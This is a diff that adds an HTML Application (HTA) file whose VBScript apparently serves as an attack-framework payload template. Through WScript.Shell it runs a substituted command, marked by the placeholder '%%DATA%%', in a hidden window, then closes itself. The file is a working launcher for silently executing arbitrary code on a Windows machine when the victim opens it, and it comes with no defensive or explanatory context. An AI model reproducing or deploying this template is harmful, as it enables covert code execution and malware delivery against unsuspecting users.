@@ -1,0 +1,10 @@
+<script language="VBScript">
+	Function var_func()
+		Dim var_shell
+		Set var_shell = CreateObject("Wscript.Shell")
+		var_shell.run "%%DATA%%", 0, true
+	End Function
+
+	var_func
+	self.close
+</script>
